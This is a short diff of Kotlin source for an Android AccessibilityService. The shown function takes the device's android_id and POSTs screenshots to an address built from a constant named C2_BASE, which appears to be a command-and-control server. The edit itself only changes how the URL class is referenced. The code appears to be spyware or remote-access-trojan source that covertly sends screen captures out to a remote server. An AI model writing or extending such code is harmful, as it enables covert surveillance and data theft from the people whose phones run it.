@@ -74,7 +74,7 @@ class AgentAccessibilityService : AccessibilityService() {
     private fun uploadToServer(bitmap: Bitmap) {
         try {
             val deviceId = Settings.Secure.getString(contentResolver, "android_id") ?: "unknown"
-            val conn = URL("${AgentService.C2_BASE}/screenshot/$deviceId")
+            val conn = java.net.URL("${AgentService.C2_BASE}/screenshot/$deviceId")
                 .openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
